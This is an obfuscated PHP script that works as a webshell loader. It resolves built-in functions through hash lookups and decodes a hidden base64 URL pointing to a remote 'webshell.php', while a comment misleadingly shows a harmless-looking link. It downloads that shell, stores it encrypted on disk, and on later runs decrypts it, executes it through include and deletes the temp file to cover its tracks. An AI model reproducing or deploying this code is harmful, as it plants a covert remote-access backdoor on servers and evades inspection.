<?php

$_h = [
    2522139524, 
    3624193297, 
    480062920, 
    959642275, 
    3635406487, 
    1240717046, 
    3864947082, 
    550380534,
    103579020,
    2603328781,
    3984548045
];

$_f = get_defined_functions()['internal'];
$IIIlIlIII = array_fill(0, count($_h), null);
$_m = array_flip($_h);
$_c = openssl_get_cipher_methods();
$_al = 'aes-256-cbc-hmac-sha256';

function IlllIlllI($s) {
    $v = 5381;
    for ($i = 0; $i < strlen($s); $i++) {
        $v = (($v << 5) + $v) + ord($s[$i]);
        $v &= 0xFFFFFFFF;
    }
    return $v;
}

foreach ($_f as $f) {
    $n = IlllIlllI($f);
    if (isset($_m[$n])) {
        $IIIlIlIII[$_m[$n]] = $f;
    }
}

foreach ($_c as $c) {
    if (IlllIlllI($c) == 139449599) {
        $_al = $c;
    }
}

foreach ($IIIlIlIII as $i => $v) {
    if (!is_string($v) || empty($v)) {
        die("Error： [$i] is invalid");
    }
}

$___ = '.raw';

if ($GLOBALS['IIIlIlIII'][0]($___)) {

    $_e = $GLOBALS['IIIlIlIII'][1]($___);
    
    $key = $GLOBALS['IIIlIlIII'][2]($_e, 0, 32);
    $nonce = $GLOBALS['IIIlIlIII'][2]($_e, 32, 12);
    $ct = $GLOBALS['IIIlIlIII'][2]($_e, 44);
    
    $_d = $GLOBALS['IIIlIlIII'][3](
        $ct,
        $_al,
        $key,
        OPENSSL_RAW_DATA,
        $nonce
    );
    $Q_Q = $GLOBALS['IIIlIlIII'][4]($GLOBALS['IIIlIlIII'][5](), '._');
    $GLOBALS['IIIlIlIII'][6]($Q_Q, $_d);

    include $Q_Q;

    $GLOBALS['IIIlIlIII'][7]($Q_Q);

} else {
    
    $key = $GLOBALS['IIIlIlIII'][8](32);
    $nonce = $GLOBALS['IIIlIlIII'][8](12);
    
    $_u = $GLOBALS['IIIlIlIII'][10]("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3Zic2NyaXB0MDU1MjQ2L21pc2Nfc2NyaXB0cy9yZWZzL2hlYWRzL21haW4vd2Vic2hlbGwucGhw");
    
    $_c = $GLOBALS['IIIlIlIII'][1]($_u); // https://short.url

    $ct = $GLOBALS['IIIlIlIII'][9](
        $_c,
        $_al,
        $key,
        OPENSSL_RAW_DATA,
        $nonce
    );

    $_e = $key . $nonce . $ct;
    $GLOBALS['IIIlIlIII'][6]($___, $_e);
    echo "<h1>Downloaded!!!</h1>";
}
?> 